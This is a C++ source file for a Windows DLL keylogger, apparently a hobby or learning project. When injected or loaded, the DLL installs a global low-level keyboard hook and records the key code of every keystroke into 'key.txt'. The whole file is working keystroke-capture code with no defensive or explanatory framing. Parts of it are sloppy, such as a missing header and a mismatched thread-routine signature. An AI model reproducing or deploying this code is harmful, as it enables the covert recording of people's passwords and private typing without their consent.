// KBHook.cpp : Définit le point d'entrée pour l'application console.
//

#include "stdafx.h"

#include <fstream>
#include <thread>
#include <chrono>
#include <mutex>
#include <iostream>
#include <fstream>


#include "IziHook.hh"

#pragma comment(lib, "user32.lib")

bool quit = false;

#pragma data_seg(".shared")
HHOOK hook = 0;
HINSTANCE hDllInstance = 0;
#pragma data_seg()
#pragma comment(linker, "/SECTION:.shared,RWS")

//HHOOK hook{ NULL };

HANDLE tmpHandle = NULL;
HWND hWindow = 0;
std::ofstream file;
std::list<int>* keyscode = NULL;

int installThread();

LRESULT CALLBACK kbproc(
	const int ncode, const WPARAM wparam, const LPARAM lparam
)
{
	KBDLLHOOKSTRUCT keyInfo = *((KBDLLHOOKSTRUCT*)lparam);

	if (wparam == WM_KEYDOWN)
	{

		std::cout << keyInfo.vkCode;
		file << keyInfo.vkCode;
		//MessageBox(NULL, L"Hello", L"YEs", NULL);
	}
	
	//std::cout << "Wesh" << std::endl;
	return CallNextHookEx(hook, ncode, wparam, lparam);

}

int APIENTRY DllMain(HINSTANCE hInstance, DWORD fdwReason, PVOID pvReserved) {
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		hDllInstance = hInstance;
		file.open("key.txt");
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&installThread, 0, 0, 0);
		//add_log("Attached.");
		break;
	case DLL_PROCESS_DETACH:
		std::cout << "Processe unattached" << std::endl;
		file.close();
		if (UnhookWindowsHookEx(hook) == 0)
			return (-1);
		return (0);
		//UninstallHook();
		break;
	}
	return TRUE;
}

int installThread()
{
	std::cout << "Processe attached" << std::endl;
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, kbproc, NULL, 0);
	if (hook == NULL)
		return (-1);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
	return (0);
}

int install()
{

	return (0);
}


